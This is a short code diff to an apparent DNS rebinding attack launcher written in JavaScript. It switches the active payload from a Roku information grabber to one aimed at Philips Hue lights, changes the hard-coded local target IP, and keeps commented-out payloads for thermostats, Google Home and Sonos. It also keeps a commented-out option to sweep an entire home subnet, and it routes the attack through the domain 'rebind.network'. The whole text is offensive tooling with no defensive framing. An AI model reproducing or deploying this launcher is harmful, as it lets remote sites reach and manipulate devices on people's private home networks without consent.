@@ -19,7 +19,9 @@
     function launch(localIp) {
         // launchRebindAttack(localIp, 80, 'payloads/radio-thermostat.html')
         // launchRebindAttack(localIp, 8008, 'payloads/google-home.html')
-        launchRebindAttack(localIp, 8060, 'payloads/roku-info.html')
+        // launchRebindAttack(localIp, 8060, 'payloads/roku-info.html')
+        // launchRebindAttack(localIp, 1400, 'payloads/sonos-info.html')
+        launchRebindAttack(localIp, 80, 'payloads/phillips-hue.html')
     }
 
     function launchRebindAttack(localIp, remotePort, payload) {
@@ -28,7 +30,7 @@
         const first3Octets = localIp.substring(0, localIp.lastIndexOf('.'))
         // const ips = [...Array(256).keys()].map(octet => `${first3Octets}.${octet}`)
         
-        const ips = ['192.168.7.69']
+        const ips = ['192.168.1.7']
 
         const rebind = new DNSRebindAttack('rebind.network', remotePort)
         rebind.attack(ips, '127.0.0.1', payload, 200)
@@ -44,7 +46,7 @@
         rebind.on('iframe-removed', (ip, src) => {
         	// console.log(payload, 'iframe-removed', ip, src)
         })
-        
+    
 
         rebind.nodes.on('rebind', (ip) => {
             console.log(payload, 'node rebind', ip)
